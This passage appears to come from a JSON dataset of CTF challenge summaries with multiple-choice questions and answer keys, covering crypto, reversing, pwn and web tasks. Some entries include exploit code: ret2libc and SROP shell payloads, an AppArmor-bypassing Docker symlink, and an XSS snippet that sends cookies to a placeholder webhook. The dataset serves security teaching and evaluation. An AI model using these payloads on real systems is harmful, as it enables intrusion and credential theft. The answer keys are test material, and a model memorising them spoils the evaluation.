            "Dragon/2020",
            "https://ctftime.org/event/1082/tasks/"
        ],
        "score": 421,
        "max_score": 500,
        "difficulty": 0.842,
        "knowledge": [
            "In scenarios where AppArmor or similar security mechanisms are implemented to restrict access to specific files or paths at runtime, but not during the build process of a container, it is possible to circumvent these restrictions by creating symlinks within a Docker image during its build phase. These symlinks can then be utilized to indirectly access restricted paths when the image is mounted and run. This technique exploits the behavior of Docker that resolves symlinks when mounting volumes with the `docker run -v /hostpath:/containerpath ...` command.",
            "To exfiltrate data from restricted paths in controlled environments like CTF challenges or secure containers, consider creating a Docker image that includes a symlink pointing from an allowed path to the restricted target. During the runtime, even if direct access to the target is denied, the mounted volume will follow the symlink, thus bypassing path-based access controls and enabling read access to the restricted file. This approach relies on exploiting the difference between build-time and run-time security policies and the way Docker handles symlinks during volume mounting.\n   \n   Example Dockerfile snippet showing the symlink creation:\n   ```\n   FROM ubuntu\n   RUN ln -s /target-restricted-path /accessible-path\n   ```\n   And during build and run phases, exploiting this setup to access data in the restricted `/target-restricted-path` via the symlink at `/accessible-path`."
        ],
        "question": [
            "In a Dockerized environment with AppArmor policies applied, which condition allows for circumventing file path restrictions? - A. AppArmor directly blocks symlink resolution during the container runtime. - B. Docker does not allow symlink creation during the build phase. - C. Docker resolves symlinks when mounting volumes, allowing access to restricted paths if a symlink is created during the image's build phase. - D. AppArmor policies are automatically relaxed during the Docker image build process.",
            "Which Dockerfile command is crucial for exploiting the difference between build-time and run-time security policies to bypass path-based restrictions using symlinks? - A. COPY /flag-* /unrestricted-path - B. RUN ln -s /restricted-path /accessible-path - C. CMD chmod 777 /flag-* - D. EXPOSE 8080: /restricted-path"
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Appnote",
        "write_up": "dataset/raw/Appnote.md",
        "type": "misc",
        "competition": [
            "GoogleCTF/2022",
            "https://ctftime.org/event/1641/tasks/"
        ],
        "score": 50,
        "max_score": 314,
        "difficulty": 0.1592356687898089,
        "knowledge": [
            "When dealing with ZIP archive challenges where the content does not seem to match the expected output, it's beneficial to explore the ZIP file's structure using tools like `strings`, `binwalk`, and a hex editor. This approach is useful for identifying hidden files or manipulated structures within the ZIP that are not readily extractable by standard archive managers. This strategy can reveal additional files or data that are crucial for solving the challenge.",
            "Manipulated ZIP archives can sometimes include multiple End Of Central Directory (EOCD) records to hide the presence of additional files. By understanding the ZIP file format specification, one can manually navigate to the Central Directory Structure's offsets to extract hidden information directly from the File Data. This method requires creating or modifying scripts to jump to specific positions in the archive, thereby bypassing the manipulation and extracting the hidden content. Sample approach for recovering manipulated ZIP content involves writing or using existing scripts to reconstruct a valid ZIP archive from the manipulated one, thus making the hidden files accessible. For example, a Python script that copies all desired headers to a new, valid ZIP file to extract hidden data or flags."
        ],
        "question": [
            "When analyzing a ZIP file that does not reveal its content with standard extraction methods, which tool or approach is BEST for identifying additional files or manipulated structures within the ZIP archive?  - A. Use a text editor to manually search for file names. - B. Employ `binwalk` and a hex editor to inspect the ZIP's file structure for hidden files and manipulated archives. - C. Only use `unzip` command in terminal with special flags to force extracting hidden files. - D. Rely on antivirus software to detect any hidden content within the ZIP archive. ",
            "In a manipulated ZIP archive containing multiple End Of Central Directory (EOCD) records to conceal additional files, which method is MOST effective for extracting this hidden information?  - A. Adjust the system's date and time settings to match the ZIP's timestamp for hidden files to appear. - B. Change the extension of the ZIP file to another format like RAR or 7Z to bypass the manipulation. - C. Manually navigate to Central Directory Structure's offsets using a hex editor and extract the hidden content directly from the File Data. - D. Use file recovery software to restore any previously deleted content from the ZIP archive that might contain the hidden files. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "aptenodytes-forsteri",
        "write_up": "dataset/raw/aptenodytes-forsteri.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 183,
        "max_score": 493,
        "difficulty": 0.3711967545638945,
        "knowledge": [
            "When faced with a substitution cipher challenge, identifying the pattern of character transformation is crucial. The transformation can often be a simple operation like shifting characters by a fixed number in the alphabet. Understanding this, one can reverse-engineer the encryption to retrieve the original message. Example approach: If the encryption uses a shift of 18 positions in the alphabet, the decryption would apply the opposite: shifting 26 - 18 = 8 positions back.",
            "To automate the decryption process or analyze the encryption method in cryptographic challenges, scripting can be highly beneficial. A Python script that maps the relation between the plaintext and ciphertext alphabets can be written. This script can then be extended or modified to decrypt the given ciphertext, significantly speeding up the solving process when dealing with familiar patterns of encryption like in this substitution cipher challenge."
        ],
        "question": [
            "In a substitution cipher challenge, if an encrypted message was created by shifting each letter by a certain number of positions in the alphabet, which formula would be correct for decrypting a character given the shift was 18 positions? - A. (character_position + 18) % 26 - B. (character_position - 18) % 26 - C. (character_position + 8) % 26 - D. (character_position - (26 - 18)) % 26",
            "When solving a substitution cipher using a Python script, if the original script used to encrypt the message shifts characters by 18 positions to generate a ciphered message, which part of the script is primarily modified for decryption? - A. Change the script to shift characters by 26 positions - B. Change the script to subtract 18 from the character's position - C. Modify the encoded letter calculation by adding 18 instead of subtracting - D. Modify the shift calculation from `(letters.index(character) + 18) % 26` to `(letters.index(character) - 18) % 26`"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "ArbCrypt",
        "write_up": "dataset/raw/ArbCrypt.md",
        "type": "crypto",
        "competition": [
            "Sunshine/2019",
            "https://ctftime.org/event/767/tasks/"
        ],
        "score": 200,
        "max_score": 350,
        "difficulty": 0.5714285714285714,
        "knowledge": [
            "When encountering ciphers that involve rotation or substitution, it's vital to consider common or well-known ciphers such as ROT47 or ROT13. Tools like dcode.fr can be utilized for decoding. This approach is especially useful when the ciphertext does not immediately suggest a specific encryption method. Example payload for ROT47: `~C8 =39 A?2V8 73J:C 8FG7 AF?JJC2ECP` decodes to `Org lbh pna'g fbyir guvf punyyratr!`.",
            "In challenges involving audio files or cryptic messages, where the content is not directly interpretable as text, look for patterns or identifiable schemes such as the NATO Phonetic Alphabet for initial decoding. Further transformation, such as applying a Caesar Cipher with a hinted shift (e.g., a number provided in the message), may be required to retrieve the plaintext or flag. This method highlights the importance of recognizing and decoding encoded messages through multiple layers of obfuscation. Example transformation: Hotel Kilo Charlie Golf... with a shift of 6 decodes to `bewaretheidesofmarch`."
        ],
        "question": [
            "Given a ciphertext `~C8 =39 A?2V8 73J:C 8FG7 AF?JJC2ECP` that when decoded using a particular cipher reveals a readable message, which cipher is most likely used based on common cryptographic techniques for texts with symbols and numbers? - A. Polybius Square - B. ROT13 - C. Caesar Cipher - D. ROT47",
            "If you encounter an audio file in a cybersecurity challenge that, when transcribed, seems to list a series of words aligning with the NATO Phonetic Alphabet followed by a number suggesting a shift, which classic cipher technique should you likely apply afterwards to unveil a hidden plaintext message? - A. Vigen\u00e8re Cipher - B. Caesar Cipher - C. AES Encryption - D. Polybius Square"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Archimedes",
        "write_up": "dataset/raw/Archimedes.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 195,
        "max_score": 500,
        "difficulty": 0.39,
        "knowledge": [
            "When dealing with puzzles requiring brute force to find numeric strings, a straightforward approach is to use a loop to iterate through potential values, convert them to strings, and check each against the puzzle's validation function. This method is particularly effective when the validation logic is known and can be executed quickly. For instance, replicating the logic of a challenge's verification function in a separate program and iterating through potential inputs to find a valid solution can efficiently crack numeric secrets. \n   - Example of iterating through potential numeric strings: \n     ```c\n     for (size_t i = 0; i < MAX_POSSIBLE_VALUE; ++i) {\n       snprintf(buf, sizeof(buf), \"%d\", (int)i);\n       if (verification_function(buf)) {\n         // Found the valid numeric string\n         break;\n       }\n     }\n     ```",
            "For vulnerabilities involving stack overflows or format string vulnerabilities where the payload needs to bypass protections like canaries, one approach is to manipulate the input mechanism (e.g., using invalid characters for `scanf`) in such a way that it bypasses the overwrite of critical security checks (such as stack canaries) but still allows for overflow or control of other vulnerable parameters. Specifically, providing an input that causes a read or parse operation to fail in a controlled fashion can allow subsequent operations to proceed unsafely, leading to potential exploitation paths.\n   - Example of using input to bypass canary checks without triggering security mechanisms: \n     ```python\n     for i in xrange(required_length):\n       sh.sendline(\"-\")  # Cause scanf to fail in a controlled manner, leaving the canary untouched\n     payload = crafted_payload_to_control_execution_flow  # including address overwrites, ROP chains, etc.\n     sh.sendline(payload)\n     ```"
        ],
        "question": [
            "When attempting to brute-force a numeric string within a practical range in a CTF challenge, which C statement correctly demonstrates an efficient loop structure for this task? - A. for (int i = 0; i < 1000000000; i++) { printf(\"%d\\n\", i); } - B. int i = 0; while (true) { printf(\"%s\", i); i++; } - C. size_t i; for (i = 0; i <= MAX_POSSIBLE_VALUE; ++i) { char buf[20]; snprintf(buf, sizeof(buf), \"%ld\", i); if (verify_function(buf)) { printf(\"Found: %s\", buf); break; } } - D. int i = 100; do { printf(\"%d\", i); i--; } while(i > 0); ",
            "In a scenario where exploiting a stack overflow or format string vulnerability requires bypassing canary protections without altering the canary value, which approach is most applicable? - A. Using a format string vulnerability to directly overwrite the canary with its known value. - B. Crafting an input that causes a failure in reading or parsing operations, preventing the modification of the canary. - C. Employing an off-by-one error to increment the canary's value and bypass the check. - D. Allocating a large buffer to overflow and directly overwrite the return address, ignoring the canary. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Arithmetic",
        "write_up": "dataset/raw/Arithmetic.md",
        "type": "This is a **pwn** challenge.",
        "competition": [
            "MidnightSun/2022/Quals",
            "https://ctftime.org/event/1474/tasks/"
        ],
        "score": -1.0,
        "max_score": 909,
        "difficulty": -1,
        "knowledge": [
            "When dealing with arithmetic operations in a scenario where the data type is specified as `uint32_t` or any other unsigned integer type, and input restrictions prevent using negative numbers, consider integer overflow vulnerability. Integer overflow occurs when the result of an arithmetic operation exceeds the maximum value the data type can hold, causing the value to wrap around. For `uint32_t`, this maximum value is \\(2^{32}-1\\). This can be manipulated by performing operations that exceed this limit, forcing the integer to overflow and wrap around to a value that might not be directly inputtable due to constraints.",
            "To exploit an integer overflow vulnerability effectively, calculate the overflow point wrapping back to zero and use it to reach the desired number. For a `uint32_t` variable, if the goal is to achieve an arithmetic result that seems impossible due to constraints on input (e.g., no negative numbers), subtract the integer representing the \"overflow\" from the desired result, then add this number to the wrapped around value. For instance, if trying to solve \\(x + 2718281828 = 42\\), calculate \\(2^{32} - 2718281828 + 42\\) to find the input that causes an overflow and achieves the desired result, considering the overflow wraps the value back to 0 at \\(2^{32}\\).\n\nExample Payload:  \nInput number: 1576685510"
        ],
        "question": [
            "What is the maximum value a uint32_t type variable can hold, which is crucial to understanding the integer overflow vulnerability in arithmetic operations? - A. 2147483647 - B. 4294967295 - C. 18446744073709551615 - D. 65535",
            "In a situation where you need to solve for `x` in an equation `x + 2718281828 = 42` without the ability to use negative numbers and considering integer overflow for a `uint32_t` data type, which calculation will give you the correct input number to cause an overflow and solve the equation? - A. \\(2^{16} - 2718281828 + 42\\) - B. \\(2^{64} - 2718281828 + 42\\) - C. \\(2^{32} - 2718281828 + 42\\) - D. \\(2^{8} - 2718281828 + 42\\)"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Armoury",
        "write_up": "dataset/raw/Armoury.md",
        "type": "pwn",
        "competition": [
            "Pragyan/2019",
            "https://ctftime.org/event/755/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a format string vulnerability in a program to leak memory addresses, specific argument positions can reveal useful information. For instance, the 3rd argument (%3$p) may disclose libc addresses, the 13th argument (%13$p) can leak the canary value (protection against buffer overflow), and the 14th argument (%14$p) might reveal saved base pointer (sfp) addresses. This knowledge aids in constructing exploits by providing valuable addresses needed for bypassing security mechanisms. In scenarios employing ret2libc attacks, knowing these positions facilitates crafting payloads to gain unauthorized access or execute arbitrary code.",
            "To construct a successful ret2libc payload in a 64-bit environment with stack canaries and ASLR enabled, the exploit must include the leaked canary value to bypass stack protection, and gadgets like \"pop rdi; ret\" to control the RDI register (used for passing the first argument to functions according to the x86_64 calling convention). Additionally, calculating the base address of libc and the ELF executable from leaked addresses enables precise targeting of system() and \"/bin/sh\". This approach allows an attacker to execute a shell despite protections, by carefully aligning the ROP (Return Oriented Programming) chain to call system(\"/bin/sh\") effectively.\n\nExample payload construction for a ret2libc attack in a 64-bit environment:\n\n```python\npayload = \"A\"*24  # Buffer overflow up to the canary\npayload += p64(canary)  # Canary value leaked from the stack\npayload += \"B\"*8  # Overwrite saved RBP (Base Pointer)\npayload += p64(pop_rdi)  # Gadget to control RDI register\npayload += p64(binsh_addr)  # Address of \"/bin/sh\" in libc\npayload += p64(system_addr)  # Address of system() in libc\npayload += \"\\n\"\n```"
        ],
        "question": [
            "In an attack scenario, when dealing with a format string vulnerability that allows an attacker to leak memory addresses, which argument position(s) should an attacker focus on to reveal the canary value specifically designed to protect against buffer overflow attacks? - A. %3$p to reveal libc addresses - B. %14$p to reveal saved base pointer addresses - C. %11$p to directly execute arbitrary code - D. %13$p to leak the canary value",
            "When constructing a payload for a ret2libc attack on a 64-bit system with stack protection and ASLR enabled, which of the following is essential for successfully directing the control flow to execute a shell? - A. Overwriting the saved base pointer with the address of a \"jmp esp\" gadget - B. Including the leaked canary value into the payload to bypass stack protection - C. Using a \"push rsp; ret\" gadget to manipulate the stack pointer directly - D. Calculating the address of a non-existent \"execve\" function within the binary"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Artscii",
        "write_up": "dataset/raw/Artscii.md",
        "type": "misc",
        "competition": [
            "insomnihack/2023/Quals",
            "https://ctftime.org/event/1831/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When faced with an encoded message in a CTF challenge where the encoding involves merging lines or characters from different fonts, Python's `zip` function combined with list comprehensions can be employed to efficiently compare and merge these lines or characters. This approach is particularly useful in challenges involving visual encoding or steganography where patterns or characters need to be combined or compared line by line or character by character. This method can systematically analyze the data, significantly reducing the complexity of brute-forcing the correct pattern or character sequence.",
            "In challenges where the output is generated using a select few from a large set of possible options (e.g., fonts, characters, encryption algorithms), brute-forcing all combinations of these options is a viable strategy, especially when the number of options is relatively small (e.g., ~100 fonts). This technique is applicable when the correct combination produces a unique or identifiable output, making it possible to programmatically determine the correct choice among many. This strategy is particularly effective in scenarios where patterns, encodings, or cryptographic algorithms are employed with a limited set of keys or configurations."
        ],
        "question": [
            "In a Python script designed to encode a message using different fonts, a function utilizes `zip` in combination with list comprehensions to merge two lines of text. Based on the provided scenario, which of the following correctly describes how the mergeLines function works? - A. The function iterates over two lines of text simultaneously and appends a '#' to the result string if the corresponding characters from two lines differ, and a ' ' (space) otherwise. - B. The function concatenates two lines of text directly without checking for differences between the characters. - C. The function returns a combination of the two lines where characters from the second line replace those in the first line if they are alphanumeric. - D. The function takes the first character of the first line and merges it with the last character of the second line, creating a pattern. ",
            "In a challenge where the flag is generated by overlaying text from three different fonts, how does the process of identifying the correct fonts out of approximately 100 choices proceed, as per the described method? - A. By creating a hash of each font and comparing it against a precomputed hash of the desired output. - B. By visually inspecting the output of each font one by one until a match with the encoded message is found. - C. By brute-forcing all possible font combinations and comparing the generated output against the target, identifying the correct fonts based on the accuracy of the match. - D. By using a complex machine learning algorithm to predict the font based on the shapes and patterns of the characters in the encoded message. "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "asm",
        "write_up": "dataset/raw/asm.md",
        "type": "pwn",
        "competition": [
            "BCACTF/2022",
            "https://ctftime.org/event/1602/tasks/"
        ],
        "score": -1.0,
        "max_score": 350,
        "difficulty": -1,
        "knowledge": [
            "When a binary lacks enough gadgets for a Return-Oriented Programming (ROP) chain and no external libraries for a ret2libc attack, Sigreturn-Oriented Programming (SROP) can be an effective exploitation technique. This approach utilizes a crafted sigreturn frame to manipulate the kernel into executing a syscall of choice, such as `execve` to spawn a shell, by preparing the syscall number in the RAX register and setting other necessary registers (RDI, RSI, RDX, RIP) accordingly within the frame.",
            "Managing the RAX register value to perform SROP can be achieved by utilizing the return value of a syscall. For instance, a read syscall's return value, which is stored in RAX, indicates the number of bytes read. By controlling the input size, an attacker can set the RAX register to a specific value required for triggering the `sigreturn` syscall (`sys_rt_sigreturn` with RAX=0xf on x86-64 architectures). This method circumvents the lack of direct gadgets to set RAX.\n\nExample payload to set up and trigger SROP:\n\n```python\nfrom pwn import *\n\ncontext.arch = \"amd64\"\n\nsh_addr = 0x000000000040200f  # Address of \"/bin/sh\" string in memory\nsyscall_gadget = 0x0000000000401019  # Address of the syscall instruction\nread_gadget = p64(0x40101b)  # Address to return to the read call\n\nframe = SigreturnFrame()\nframe.rax = 59  # syscall number for execve\nframe.rdi = sh_addr  # First argument to execve: pointer to \"/bin/sh\"\nframe.rsi = 0  # Second argument to execve: argv array\nframe.rdx = 0  # Third argument to execve: envp array\nframe.rsp = 0  # Stack pointer\nframe.rip = syscall_gadget  # Instruction pointer to return to the syscall gadget\n\npayload = b\"a\" * 32 + read_gadget + p64(syscall_gadget) + bytes(frame)\n\n# Send the payload to the vulnerable program\n```\n\nThis payload demonstrates setting up a sigreturn frame after a buffer overflow, setting RAX through a read syscall, and invoking `execve(\"/bin/sh\", NULL, NULL)` through SROP."
        ],
        "question": [
            "In a situation where traditional Return-Oriented Programming (ROP) and ret2libc attacks are not feasible due to the binary's size and lack of external libraries, what exploitation technique can be leveraged to execute arbitrary code by crafting a specific structure on the stack?  - A. Jump-Oriented Programming (JOP) - B. Sigreturn-Oriented Programming (SROP) - C. Format String Exploitation - D. Heap Spraying Exploitation ",
            "When performing Sigreturn-Oriented Programming (SROP) on an x86-64 architecture to trigger a `sys_rt_sigreturn` syscall, which technique can be used to set the RAX register to the required value of 0xf without having direct gadgets to manipulate RAX?  - A. By performing a write syscall and controlling the number of bytes written. - B. By utilizing a heap overflow to corrupt the RAX register value directly. - C. By executing a read syscall and controlling the exact number of bytes read, thereby setting RAX to the number of bytes read. - D. By employing a format string vulnerability to write the desired value into RAX. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "asr",
        "write_up": "dataset/raw/asr.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges focusing on RSA where the private exponent \\(d\\) is known but the modulus \\(N\\) is not, one can determine \\(N\\) by leveraging the property that \\(ed - 1\\) is a multiple of \\(\\phi(N)\\). Factor \\(ed - 1\\) using an external service, then use the factorization to find potential values for \\(\\phi(N)\\). This process requires knowledge of the relationship \\(ed \\equiv 1 \\mod \\phi(N)\\).",
            "When dealing with multiple prime factors of \\(ed - 1\\), particularly in cases where there are a significant number of them (as in the challenge, with 16 64-bit primes), one can use combinatorial methods to organize these primes into two groups which then help generate potential prime factors \\(p\\) and \\(q\\) of \\(N\\). This is based on knowing how to pair factors to attempt a reconstruction of \\(N = p \\times q\\). A brute-force approach, iterating through all possible combinations (`${16 \\choose 8} = 12870` combinations as mentioned), can be manageable with computational tools and can lead to finding the correct modulus when validated against known conditions (e.g., primes leading to a valid \\(N\\)).\n\nNo specific payload is necessary for the explanation above."
        ],
        "question": [
            "In an RSA challenge where the private exponent \\(d\\) is given instead of the modulus \\(N\\), which of the following best explains the requirement for determining \\(N\\) using the relationship between \\(d\\) and the public exponent \\(e\\)? - A. Calculate \\(e^d \\mod N\\) to directly obtain \\(\\phi(N)\\). - B. Determine \\(ed - 1\\) as a multiple of \\(\\phi(N)\\) to use in factoring and finding potential values for \\(N\\). - C. Use \\(d\\) to directly calculate the prime factors of \\(N\\) without the need for \\(e\\). - D. Encrypt \\(d\\) with \\(e\\) to find all possible values of \\(N\\) without factorization. ",
            "In the scenario of organizing 16 64-bit prime factors of \\(ed - 1\\) into two groups to reconstruct the modulus \\(N\\) for an RSA encryption scenario, what best describes the combinatorial challenge faced and its solution? - A. Utilize the equation \\(ed = 1 + kN\\) to divide the primes into uneven groups for faster computation. - B. Randomly assign primes into two groups and calculate \\(N\\) without considering combinatorial methods. - C. Use combinatorial methods to calculate \\({16 \\choose 8} = 12870\\) and iterate through possible groupings to generate \\(p\\) and \\(q\\). - D. Ignore combinatorial methods and focus on using a single prime factor to reduce complexity. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "AstroBot",
        "write_up": "dataset/raw/AstroBot.md",
        "type": "reverse",
        "competition": [
            "Pwn2Win/2019",
            "https://ctftime.org/event/822/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When designing a bot to interact with a game or a service over the network, consider the network latency and plan to send commands ahead of time to account for delays. This strategy improves the bot's performance and reliability in real-time scenarios. \n\n    - Example context: For games where quick reaction times are crucial, send movement commands in advance based on the expected network delay to ensure the bot responds as if there was no latency.",
            "In automation challenges where the task involves predictable patterns (e.g., dodging obstacles or solving puzzles with fixed sequences), manually identifying and encoding the pattern into the bot can be more efficient than developing complex pathfinding algorithms. Once a repeating pattern is identified, commands can be replicated for each cycle of the pattern to achieve the desired outcome.\n\n    - Example context: If a game's obstacles follow a known, repeatable pattern after a certain number of moves or time intervals, manually record the successful commands for one cycle and loop them for the duration of the challenge/game."
        ],
        "question": [
            "When designing a script to automate gameplay for a network-based game, how can the problem of network latency affecting real-time responses be mitigated? - A. Send commands only after receiving confirmation of the last command's success. - B. Increase the script's sleep time between commands to allow for network delays. - C. Send commands in real-time without accounting for network delays. - D. Plan and send commands ahead of time, considering the estimated network latency to ensure timely actions in the game. ",
            "In the context of automating a game with obstacles and collectibles following a fixed pattern, which approach can efficiently ensure success without the need for complex programming? - A. Use advanced machine learning models to predict obstacles and navigate in real-time. - B. Manually input the successful sequence of commands for one complete cycle of the pattern and repeat it for the game's duration. - C. Randomly generate commands in hopes of eventually finding a pattern that works. - D. Develop a complex pathfinding algorithm that can adapt to any possible obstacle layout. "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "aush",
        "write_up": "dataset/raw/aush.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2023",
            "https://ctftime.org/event/1972/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "Buffer overflow vulnerabilities can be exploited due to insufficient input validation. When reading user input, an application should always validate the size of the input against the size of the buffer it is stored in. In scenarios where input is read directly into a stack-allocated buffer without size checks, an attacker can supply data that exceeds the buffer's capacity, leading to overwriting adjacent memory. This vulnerability is evident in code that does not correctly limit the number of bytes read from an input stream to the buffer's size, as seen with `read(STDIN_FILENO, inpuser, 0x200)`, where `0x200` bytes are read into a buffer that is significantly smaller.",
            "To maintain application stability post-exploitation and ensure further execution with elevated privileges, attackers may need to correct or mitigate the effects of their exploitation techniques. In the discussed scenario, overwriting the `envp` array with a buffer overflow corrupts the application state, which could impede further exploitation steps, such as executing a shell. By carefully controlling the overflow to overwrite specific parts of the application's memory, such as nullifying the corrupted `envp` array (by padding the overflow payload with null bytes after necessary payload data), attackers can restore partial application functionality or bypass additional security checks, leading to successful exploitation.\n\nExample payload structure for the second point (simplified for understanding):\n```\n\"A\"*32 + \"\\x00\"*remaining_bytes\n```\nThis payload would fill the `password` buffer with 32 \"A\" characters, followed by a series of null bytes to overwrite the `envp` array to a point where it's effectively null-terminated, restoring its functionality to a usable state for further exploitation steps."
        ],
        "question": [
            "In the context of reading user input into stack-allocated buffers in C, which of the following best describes a secure practice to prevent buffer overflows? - A. Use `read(fd, buffer, buffer_size)` without checking the size of the input against the buffer's capacity. - B. Allocate a buffer with a fixed size and read input directly into it using a size limit that exceeds the buffer's capacity. - C. Perform input validation by ensuring the number of bytes read from an input stream does not exceed the buffer's allocated size. - D. Increase the buffer size dynamically based on the size of the input to accommodate any length of data. ",
            "After a successful buffer overflow attack that corrupts the `envp` array in a C application, what technique can be used to continue exploitation by ensuring the application's stability? - A. Overwrite the entire stack with arbitrary data to ensure the overflow reaches critical application structures. - B. Leave the `envp` array corrupted as it does not affect the application's execution flow or stability. - C. Use a payload that includes a sequence of 'A's followed immediately by executable shellcode to take direct control. - D. Correct the overflow's side effects by nullifying the corrupted `envp` array with an appropriate amount of null bytes after the overflow payload. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "auth3ntication",
        "write_up": "dataset/raw/auth3ntication.md",
        "type": "web",
        "competition": [
            "BSidesDelhi/2018",
            "https://ctftime.org/event/700/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When faced with a XOR-based authentication mechanism in a web application, one effective approach involves iteratively XORing each byte of the encrypted data (`func` variable in the context) with every possible byte value (0-255) until a pattern that matches expected clear text (known plaintext attack) emerges. This method is particularly useful when the encryption key is shorter than the data it encrypts, requiring the key to repeat over the length of the data. This repetition can be exploited by shifting the known plaintext across the encrypted data to find the decryption key.",
            "In scenarios where the logic of the web application is obscured or employs client-side checks, extracting and analyzing the JavaScript code can reveal vulnerabilities and flawed logic, such as reliance on client-side security for authentication checks. Directly manipulating or bypassing this client-side logic, such as through modifying the expected inputs or outcomes within the browser\u2019s console or by crafting specific requests, can lead to unauthorized access or disclosure of sensitive information.\n\nExample payload based on extracted knowledge:\n```javascript\n// Assuming 'func' is the encrypted data and 'knownText' is a piece of expected plaintext\nfor(w=0; w<func.length;w++) {  \n    buf = \"\";\n    var g = tmp;  \n    var arr = g.split(\"\");  \n    arr.splice(w, knownText.length, knownText);  \n    var result = arr.join(\"\");\n\n    k = result.substring(0, func.length);\n\n    for(i = 0, j = 0; i < func.length; i++) {  \n        c = parseInt(func.charCodeAt(i));  \n        c = c ^ k.charCodeAt(j);  \n        if(++j == k.length) {  \n            j = 0;  \n        }  \n        buf += String.fromCharCode(c);  \n    }  \n\n    // Outputting potential decrypted data to check for readability or expected patterns\n    console.log(buf);  \n}\n```\nThis example does not replicate the exact code used in the challenge solution but follows the conceptual explanation on how to approach XOR encryption weaknesses in a CTF challenge, focusing on using known plaintext to derive the encryption key."
        ],
        "question": [
            "In a web authentication challenge utilizing XOR-based encryption, the method of utilizing a known plaintext attack for decryption involves shifting the known plaintext across which part of the encrypted data to derive the encryption key? - A. The initialization vector (IV) of the encryption algorithm - B. Each byte of the encrypted data by XORing it with every possible byte value - C. The hash of the encrypted data using a cryptographic hash function - D. The metadata of the encrypted data to identify its encryption algorithm",
            "When analyzing a web application that uses a client-side JavaScript for authentication checks, what is a common vulnerability that can be exploited for unauthorized access? - A. Server-side validation checks that rely on input length - B. Encryption algorithms that use secure HTTPS protocols - C. Lack of proper session management in the server-side application - D. Reliance on client-side logic for security checks without adequate server-side validation"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "b01ler-ad",
        "write_up": "dataset/raw/b01ler-ad.md",
        "type": "web",
        "competition": [
            "b01lers/2024",
            "https://ctftime.org/event/2250/tasks/"
        ],
        "score": 302,
        "max_score": 438,
        "difficulty": 0.6894977168949772,
        "knowledge": [
            "In scenarios involving server-side request forgery (SSRF) or when attempting to exfiltrate sensitive data (like cookies) using a crafted payload in a web application that uses input sanitization to prevent the use of certain characters (such as single quotes, double quotes, and backticks), URL encoding can be employed to bypass these sanitization efforts. This allows for the injection of malicious scripts or HTML by encoding the disallowed characters such that they are not caught by the sanitization process but are correctly interpreted by the browser or server. For example, replacing a single quote (') with its URL encoded counterpart (%27) can enable an attacker to inject a payload that would otherwise be sanitized.\n   - Example payload for exfiltration using URL encoding: \n     ```html\n     <script>\n       function setUrl() {\n         e = document.getElementById(%27asd%27);\n         e.src = %27%27.concat(%27https://your-webhook.site/?cookies=%27,document.cookie);\n       }\n     </script>\n     ![](%27https://example.com/image.svg%27)\n     ```",
            "In CTF challenges or security assessments where a web application uses a headless browser (like Puppeteer) to process or render user-supplied input, it's possible to exploit this feature for CSRF (Cross-Site Request Forgery), XSS (Cross-Site Scripting), or SSRF (Server-Side Request Forgery) attacks. The specific example shows exploiting the server's use of Puppeteer to send a request with its cookie to an attacker-controlled server. By crafting a payload that injects an image or script tag with a source attribute manipulated to include an attacker-controlled URL, along with any extracted data (like cookies), one can achieve data exfiltration or perform actions on behalf of the server or victim user.\n   - Example method to exploit via crafted HTML or script tag: \n     ```html\n     <script>  \n       function setUrl() {\n         e = document.getElementById(%27asd%27);\n         e.src = %27%27.concat(%27https://your-webhook.site/?cookies=%27,document.cookie);\n       }\n     </script>\n     ![](%27https://example.com/image.svg%27)\n     ```"
        ],
        "question": [
            "Given a web application that employs input sanitization to prevent XSS attacks by removing specific characters from user inputs, which of the following URL encodings is correctly used to bypass sanitization of a single quote? - A. Replacing ' with &%2347 - B. Replacing ' with %20 - C. Replacing ' with %27 - D. Replacing ' with %3F",
            "In the context of exploiting a web application that processes user-supplied input with a headless browser like Puppeteer, which technique is described for exfiltrating sensitive data such as cookies to an attacker-controlled server? - A. Embedding a direct link to the attacker's server in the application's home page - B. Utilizing server-side code execution to send the data directly to the attacker's server - C. Injecting a crafted HTML or script tag with a source set to the attacker's webhook, including extracted data like cookies - D. Modifying server response headers to redirect all traffic to the attacker\u2019s server"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "B1 - Boris",
        "write_up": "dataset/raw/B1 - Boris.md",
        "type": "This CTF challenge falls under the category of **pwn (exploit)**.",
        "competition": [
            "DigitalOverdose/2021",
            "https://ctftime.org/event/1459/tasks/"
        ],
        "score": 200,
        "max_score": 600,
        "difficulty": 0.3333333333333333,
        "knowledge": [
